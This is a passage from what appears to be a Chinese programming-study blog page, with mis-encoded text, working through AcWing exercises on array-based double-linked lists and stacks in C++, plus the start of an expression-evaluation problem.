class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œå‘½ä»¤ï¼Œæ“ä½œå‘½ä»¤å¯èƒ½ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><code>L x</code>ï¼Œè¡¨ç¤ºåœ¨é“¾è¡¨çš„æœ€å·¦ç«¯æ’å…¥æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ã€‚</li><li><code>R x</code>ï¼Œè¡¨ç¤ºåœ¨é“¾è¡¨çš„æœ€å³ç«¯æ’å…¥æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ã€‚</li><li><code>D k</code>ï¼Œè¡¨ç¤ºå°†ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°åˆ é™¤ã€‚</li><li><code>IL k x</code>ï¼Œè¡¨ç¤ºåœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å·¦ä¾§æ’å…¥ä¸€ä¸ªæ•°ã€‚</li><li><code>IR k x</code>ï¼Œè¡¨ç¤ºåœ¨ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ’å…¥çš„æ•°å³ä¾§æ’å…¥ä¸€ä¸ªæ•°ã€‚</li></ol><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼Œå°†æ•´ä¸ªé“¾è¡¨ä»å·¦åˆ°å³è¾“å‡ºã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>M</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br>æ‰€æœ‰æ“ä½œä¿è¯åˆæ³•ã€‚</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>10R 7D 1L 3IL 2 10D 3IL 2 7L 8R 9IL 4 7IR 2 2</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>8 7 7 3 2 9</code></pre><h3 id="ç®—æ³•">ç®—æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> e[kN], l[kN], r[kN], idx;  <span class="comment">// l[i]: ä¸‹æ ‡ä¸ºièŠ‚ç‚¹çš„å·¦èŠ‚ç‚¹ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–: è®¾ç½®ä¸‹æ ‡åˆ†åˆ«ä¸º0å’Œ1çš„ç‚¹ä½œä¸ºå·¦å³ç«¯ç‚¹, ç¬¬1ä¸ªå·¥ä½œèŠ‚ç‚¹çš„ä¸‹æ ‡ä¸º2</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  r[<span class="number">0</span>] = <span class="number">1</span>, r[<span class="number">1</span>] = <span class="number">0</span>, idx = <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨ä¸‹æ ‡ä¸ºkçš„å…ƒç´ åé¢æ’å…¥æ’å…¥x</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    l[idx] = k, r[idx] = r[k];</span><br><span class="line">    l[r[k]] = idx, r[k] = idx++; <span class="comment">// ä¸èƒ½å†™æˆl[r[idx]] = idx++: ä¼šå…ˆç®—idx++å¯¼è‡´idxæ”¹å˜</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Del</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  l[r[k]] = l[k], r[l[k]] = r[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> k, x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(<span class="number">0</span>, x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(l[<span class="number">1</span>], x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;D&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">      <span class="built_in">Del</span>(k + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IL&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(l[k + <span class="number">1</span>], x);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IR&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;x);</span><br><span class="line">      <span class="built_in">Insert</span>(k + <span class="number">1</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = r[<span class="number">0</span>]; i != <span class="number">1</span>; i = r[i]) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¯­æ³•é—®é¢˜">è¯­æ³•é—®é¢˜</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[cling]$ <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">[cling]$ <span class="type">int</span> idx = <span class="number">1</span>;</span><br><span class="line">[cling]$ a[idx] = idx++;</span><br><span class="line">input_line_5:<span class="number">2</span>:<span class="number">14</span>: warning: unsequenced modification <span class="keyword">and</span> access to <span class="string">&#x27;idx&#x27;</span> [-Wunsequenced]</span><br><span class="line"> a[idx] = idx++;</span><br><span class="line">   ~~~       ^</span><br><span class="line">[cling]$ <span class="built_in">a</span></span><br><span class="line">(<span class="type">int</span> [<span class="number">10</span>]) &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;  <span class="comment">// å°†idx++åå†èµ‹å€¼</span></span><br><span class="line">[cling]$ a[<span class="number">0</span>] = idx++;</span><br><span class="line">[cling]$ <span class="built_in">a</span></span><br><span class="line">(<span class="type">int</span> [<span class="number">10</span>]) &#123; <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;  <span class="comment">// å…ˆèµ‹å€¼å†++, å¦åˆ™ä¸º3 (å‰é¢++è¿‡æ‰€ä»¥ä¸º2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ ˆ">æ ˆ</h1><h2 id="AcWing-828-æ¨¡æ‹Ÿæ ˆ"><a href="https://www.acwing.com/problem/content/830/">AcWing 828. æ¨¡æ‹Ÿæ ˆ</a></h2><p>å®ç°ä¸€ä¸ªæ ˆï¼Œæ ˆåˆå§‹ä¸ºç©ºï¼Œæ”¯æŒå››ç§æ“ä½œï¼š</p><ol><li><code>push x</code> â€“ å‘æ ˆé¡¶æ’å…¥ä¸€ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼›</li><li><code>pop</code> â€“ ä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªæ•°ï¼›</li><li><code>empty</code> â€“ åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©ºï¼›</li><li><code>query</code> â€“ æŸ¥è¯¢æ ˆé¡¶å…ƒç´ ã€‚</li></ol><p>ç°åœ¨è¦å¯¹æ ˆè¿›è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> ä¸ªæ“ä½œï¼Œå…¶ä¸­çš„æ¯ä¸ªæ“ä½œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> å’Œæ“ä½œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> éƒ½è¦è¾“å‡ºç›¸åº”çš„ç»“æœã€‚</p><h4 id="è¾“å…¥æ ¼å¼">è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œè¡¨ç¤ºæ“ä½œæ¬¡æ•°ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œå‘½ä»¤ï¼Œæ“ä½œå‘½ä»¤ä¸º <code>push x</code>ï¼Œ<code>pop</code>ï¼Œ<code>empty</code>ï¼Œ<code>query</code> ä¸­çš„ä¸€ç§ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼">è¾“å‡ºæ ¼å¼</h4><p>å¯¹äºæ¯ä¸ª <code>empty</code> å’Œ <code>query</code> æ“ä½œéƒ½è¦è¾“å‡ºä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œæ¯ä¸ªç»“æœå ä¸€è¡Œã€‚</p><p>å…¶ä¸­ï¼Œ<code>empty</code> æ“ä½œçš„æŸ¥è¯¢ç»“æœä¸º <code>YES</code> æˆ– <code>NO</code>ï¼Œ<code>query</code> æ“ä½œçš„æŸ¥è¯¢ç»“æœä¸ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ ˆé¡¶å…ƒç´ çš„å€¼ã€‚</p><h4 id="æ•°æ®èŒƒå›´">æ•°æ®èŒƒå›´</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>M</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>x</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span><br>æ‰€æœ‰æ“ä½œä¿è¯åˆæ³•ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>10push 5querypush 6popquerypopemptypush 4queryempty</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>55YES4NO</code></pre><h3 id="æ•°ç»„æ¨¡æ‹Ÿæ ˆ">æ•°ç»„æ¨¡æ‹Ÿæ ˆ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> stk[kN], tt;  <span class="comment">// tt=0è¡¨ç¤ºæ ˆä¸ºç©º, ç¬¬ä¸€ä¸ªå·¥ä½œèŠ‚ç‚¹çš„ä¸‹æ ‡ä»1å¼€å§‹</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;push&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      stk[++tt] = x;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;pop&quot;</span>) &#123;</span><br><span class="line">      tt--;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;query&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, stk[tt]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;empty&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (tt?  <span class="string">&quot;NO&quot;</span>: <span class="string">&quot;YES&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-3302-è¡¨è¾¾å¼æ±‚å€¼â˜…"><a href="https://www.acwing.com/problem/content/3305/">AcWing 3302. è¡¨è¾¾å¼æ±‚å€¼â˜…</a></h2><p>ç»™å®šä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå…¶ä¸­è¿ç®—ç¬¦ä»…åŒ…å« <code>+,-,*,/</code>ï¼ˆåŠ  å‡ ä¹˜ æ•´é™¤ï¼‰ï¼Œå¯èƒ½åŒ…å«æ‹¬å·ï¼Œè¯·ä½ æ±‚å‡ºè¡¨è¾¾å¼çš„æœ€ç»ˆå€¼ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>æ•°æ®ä¿è¯ç»™å®šçš„è¡¨è¾¾å¼åˆæ³•ã€‚</li><li>é¢˜ç›®ä¿è¯ç¬¦å· <code>-</code> åªä½œä¸ºå‡å·å‡ºç°ï¼Œä¸ä¼šä½œä¸ºè´Ÿå·å‡ºç°ï¼Œä¾‹å¦‚ï¼Œ<code>-1+2</code>,<code>(2+2)*(-(1+1)+2)</code> ä¹‹ç±»è¡¨è¾¾å¼å‡ä¸ä¼šå‡ºç°ã€‚</li><li>é¢˜ç›®ä¿è¯è¡¨è¾¾å¼ä¸­æ‰€æœ‰æ•°å­—å‡ä¸ºæ­£æ•´æ•°ã€‚</li><li>é¢˜ç›®ä¿è¯è¡¨è¾¾å¼åœ¨ä¸­é—´è®¡ç®—è¿‡ç¨‹ä»¥åŠç»“æœä¸­ï¼Œå‡ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</li><li>é¢˜ç›®ä¸­çš„æ•´é™¤æ˜¯æŒ‡å‘ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å–æ•´ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºå¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> çš„ç»“æœå‘ä¸‹å–æ•´ï¼Œä¾‹å¦‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi mathvariant="normal">/</mi><mn>3</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">5/3=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5/3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œå¯¹äºå°äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> çš„ç»“æœå‘ä¸Šå–æ•´ï¼Œä¾‹å¦‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">5/(1-4) = -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5/</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span></span></span></span>ã€‚</li><li>C++å’ŒJavaä¸­çš„æ•´é™¤é»˜è®¤æ˜¯å‘é›¶å–æ•´ï¼›Pythonä¸­çš„æ•´é™¤<code>//</code>é»˜è®¤å‘ä¸‹å–æ•´ï¼Œå› æ­¤Pythonçš„<code>eval()</code>å‡½æ•°ä¸­çš„æ•´é™¤ä¹Ÿæ˜¯å‘ä¸‹å–æ•´ï¼Œåœ¨æœ¬é¢˜ä¸­ä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚</li></ul><h4 id="è¾“å…¥æ ¼å¼-2">è¾“å…¥æ ¼å¼</h4><p>å…±ä¸€è¡Œï¼Œä¸ºç»™å®šè¡¨è¾¾å¼ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-2">è¾“å‡ºæ ¼å¼</h4><p>å…±ä¸€è¡Œï¼Œä¸ºè¡¨è¾¾å¼çš„ç»“æœã€‚</p><h4 id="æ•°æ®èŒƒå›´-2">æ•°æ®èŒƒå›´</h4><p>è¡¨è¾¾å¼çš„é•¿åº¦ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-2">è¾“å…¥æ ·ä¾‹ï¼š</h4><pre><code>(2+2)*(1+1)</code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-2">è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre><code>8</code></pre><h3 id="åŸºäºæ ˆ">åŸºäºæ ˆ</h3><figure class="highlight cpp"><table><tr><td 